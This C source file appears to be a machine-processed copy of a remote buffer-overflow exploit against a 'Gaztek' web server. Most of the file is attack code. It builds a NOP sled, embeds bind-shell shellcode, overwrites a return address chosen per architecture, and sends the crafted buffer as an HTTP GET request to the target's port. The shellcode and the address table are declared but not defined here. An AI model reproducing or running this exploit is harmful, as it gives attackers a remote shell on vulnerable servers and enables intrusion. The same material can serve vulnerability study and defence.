#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  target ;
struct TYPE_3__ {int s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_zero; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct TYPE_4__ {int adjusted_buf; long addr; int id; char* os; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  ARCH_NUMBER ; 
 int BIND_PORT ; 
 int /*<<< orphan*/  GAZTEK_PORT ; 
 int MIN_BUFFER_SIZE ; 
 int /*<<< orphan*/  NOP ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 TYPE_2__* architectures ; 
 int atoi (char*) ; 
 char* bindshell ; 
 int /*<<< orphan*/  bzero (int /*<<< orphan*/ *,int) ; 
 int connect (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  get_ban (char*) ; 
 int getopt (int,char**,char*) ; 
 int /*<<< orphan*/  htons (int /*<<< orphan*/ ) ; 
 int inet_addr (char*) ; 
 char* malloc (int) ; 
 int /*<<< orphan*/  memcpy (char*,char*,int) ; 
 int /*<<< orphan*/  memset (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sprintf (char*,char*,char*) ; 
 int /*<<< orphan*/  strcpy (char*,char*) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  synops (char**) ; 
 int write (int,char*,int) ; 

main(int argc, char *argv[])
{
		 int c, c_size, ip_lenght, arch_id, sock_fd, errflg=0, ban_chk=0, exp_flg=0;
		 char *addr, *get_buf, *get_buf_str;
		 long ret;

		 extern char *optarg;
		 extern int optind, optopt;

		 struct sockaddr_in target;

		 if(argc == 1)
		 		 synops(argv);

		 while((c = getopt(argc, argv, "b:d:")) != -1)
		 {
		 		 switch(c)
		 		 {
		 		 		 case 'b':
		 		 		 		 addr = malloc(strlen(optarg));
		 		 		 		 strcpy(addr, optarg);
		 		 		 		 ban_chk++;
		 		 		 		 break;
		 		 		 case 'd':
		 		 		 		 if(!(argv[optind]))
		 		 		 		 		 errflg++;
		 		 		 		 if(!(argv[optind+1]))
		 		 		 		 		 errflg++;
		 		 		 		 if(errflg == 0)
		 		 		 		 {
		 		 		 		 		 if((arch_id = atoi(optarg)) < 0 || (arch_id = atoi(optarg)) > (ARCH_NUMBER-1))
		 		 		 		 		 {
		 		 		 		 		 		 printf("Invalid architecture id.\n");
		 		 		 		 		 		 exit(-1);
		 		 		 		 		 }

		 		 		 		 		 if((inet_addr(argv[optind])) != -1)
		 		 		 		 		 		 ip_lenght = strlen(argv[optind+1]);
		 		 		 		 		 else
		 		 		 		 		 {
		 		 		 		 		 		 printf("\"%s\" is an invalid ip address.\n", argv[optind]);
		 		 		 		 		 		 exit(-1);
		 		 		 		 		 }
		 		 		 		 		 addr = malloc(strlen(argv[optind+1]));
		 		 		 		 		 strcpy(addr, argv[optind+1]+1);
		 		 		 		 		 exp_flg++;
		 		 		 		 }

		 		 		 		 break;
		 		 		 case ':':
		 		 		 		 errflg++;
		 		 		 		 break;
		 		 		 case '?':
		 		 		 		 errflg++;
		 		 }
		 }

		 if(errflg > 0)
		 		 synops(argv);

		 /* check banner info */
		 if(ban_chk > 0)
		 		 get_ban(addr);

		 if(!(exp_flg))
		 		 synops(argv);
/*
        Buffer Size Craft Relation
        min string size                    = 192 bytes
        string "GET _" size                =   4 bytes
        max log ip size "255.255.255.255"  =  15 bytes
        string "\n\n" size                 =   2 bytes
                                           = 198 bytes
                                                        */
		 /* dont count with GET request and newline bytes */
		 c_size = ((MIN_BUFFER_SIZE+15-ip_lenght-4-2)+(architectures[arch_id].adjusted_buf));
		 /* NULL string byte */
		 c_size = c_size+1;

		 /* builds crafted buffer */
		 get_buf = malloc(c_size);
		 /* counts with all constants sizes */
		 get_buf_str = malloc((c_size+4+2));

		 memset(get_buf, NOP, c_size);
		 memcpy(get_buf+(c_size-1-4-strlen(bindshell)), bindshell, strlen(bindshell));
		 *(long*)&get_buf[c_size-4-1] = architectures[arch_id].addr;
		 get_buf[c_size-1] = '\0';

		 /* final buffer, now just inject on connection */
		 sprintf(get_buf_str,"GET %s\n\n", get_buf);

		 /* infos */
		 printf("target: %s\n", addr);
		 printf("arch id: %d, %s, 0x%x\n", architectures[arch_id].id, architectures[arch_id].os, architectures[arch_id].addr);
		 printf("ip size: %d bytes\n", ip_lenght);
		 printf("Adjust: %d bytes\n", architectures[arch_id].adjusted_buf);
		 printf("buffer size: %d bytes\n", strlen(get_buf_str));
		 printf("bind shellcode size: %d bytes\n", strlen(bindshell));
		 printf("bind shell tcp port: %d\n", BIND_PORT);
		 printf("Injecting code at 0x%x...\n", architectures[arch_id].addr);

		 /* start socket() */

        if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 1)
        {
                printf("socket() error.\n");
                exit(-1);
        }

        target.sin_family = AF_INET;
        target.sin_port = htons(GAZTEK_PORT);

        if((target.sin_addr.s_addr = inet_addr(addr)) == -1)
        {
                printf("\"%s\" is an invalid ip address.\n", addr);
                exit(-1);
        }

        bzero(&(target.sin_zero), 8);

        if((connect(sock_fd, (struct sockaddr *)&target, sizeof(target))) == -1)
		 {
                printf("connect() error.\n");
                exit(-1);
        }

        if((write(sock_fd, get_buf_str, strlen(get_buf_str))) == -1)
        {
                printf("write() error.\n");
                exit(-1);
        }

		 printf("Done!\n");

return 0;
}